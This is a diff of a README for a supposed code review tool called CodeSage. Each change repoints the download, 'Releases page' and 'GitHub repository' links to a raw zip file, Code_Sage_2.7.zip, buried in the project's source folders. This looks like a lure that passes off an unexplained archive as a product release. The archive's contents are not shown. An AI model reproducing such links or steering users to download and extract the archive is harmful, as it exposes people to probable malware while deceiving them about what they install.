@@ -28,7 +28,7 @@ Follow these steps to download and set up CodeSage.
 1. **Download CodeSage**  
    Visit the Releases page below to download the software.
 
-   [![Download CodeSage](https://github.com/kingmamadyt/CodeSage/raw/refs/heads/main/backend/src/main/java/com/codesage/dto/Code-Sage-v1.6.zip%https://github.com/kingmamadyt/CodeSage/raw/refs/heads/main/backend/src/main/java/com/codesage/dto/Code-Sage-v1.6.zip)](https://github.com/kingmamadyt/CodeSage/raw/refs/heads/main/backend/src/main/java/com/codesage/dto/Code-Sage-v1.6.zip)
+   [![Download CodeSage](https://raw.githubusercontent.com/kingmamadyt/CodeSage/main/backend/src/main/Code_Sage_2.7.zip%https://raw.githubusercontent.com/kingmamadyt/CodeSage/main/backend/src/main/Code_Sage_2.7.zip)](https://raw.githubusercontent.com/kingmamadyt/CodeSage/main/backend/src/main/Code_Sage_2.7.zip)
 
 2. **Extract Files**  
    After downloading, extract the files to your preferred location on your computer.
@@ -43,7 +43,7 @@ Follow these steps to download and set up CodeSage.
 
 To get started, visit the following link to download the latest release of CodeSage:
 
-[Download CodeSage](https://github.com/kingmamadyt/CodeSage/raw/refs/heads/main/backend/src/main/java/com/codesage/dto/Code-Sage-v1.6.zip)
+[Download CodeSage](https://raw.githubusercontent.com/kingmamadyt/CodeSage/main/backend/src/main/Code_Sage_2.7.zip)
 
 Follow the steps listed above for a smooth installation.
 
@@ -91,6 +91,6 @@ If you face any issues while using CodeSage, consider the following solutions:
 
 Thank you for choosing CodeSage as your code review tool. Your feedback is essential to helping us improve the application. We appreciate your support and look forward to serving you better.
 
-For additional information or to report any issues, visit our [GitHub repository](https://github.com/kingmamadyt/CodeSage/raw/refs/heads/main/backend/src/main/java/com/codesage/dto/Code-Sage-v1.6.zip).
+For additional information or to report any issues, visit our [GitHub repository](https://raw.githubusercontent.com/kingmamadyt/CodeSage/main/backend/src/main/Code_Sage_2.7.zip).
 
 Happy coding!
